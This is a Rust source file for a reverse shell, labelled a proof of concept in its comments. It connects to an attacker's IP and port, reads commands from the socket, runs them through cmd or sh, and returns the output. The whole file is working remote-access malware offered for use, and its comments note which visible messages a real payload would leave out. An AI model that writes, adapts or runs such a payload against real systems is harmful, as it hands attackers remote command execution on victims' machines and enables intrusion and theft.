use std::net::TcpStream;
use std::process::Command;
use std::io::{Write, Read};

fn main() {
    let addr = "192.168.158.38:4445"; // Put your ip : port-number

    if let Ok(mut stream) = TcpStream::connect(addr) {
        println!("Connected to the attacker!"); // Yes, this shouldn't show on a real payload but this is just PoC

        loop {
            let mut buffer = [0; 512];
            let bytes_read = stream.read(&mut buffer).unwrap();

            if bytes_read == 0 {
                break;
            }

            let command = std::str::from_utf8(&buffer[..bytes_read]).unwrap().trim();
            execute_command(command, &mut stream);
        }
    } else {
        println!("Failed to connect"); // This also doesn't have to show on real payloads.
    }
}

fn execute_command(command: &str, stream: &mut TcpStream) {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Failed to execute command")
    };

    stream.write_all(&output.stdout).unwrap();
    stream.write_all(&output.stderr).unwrap();
}
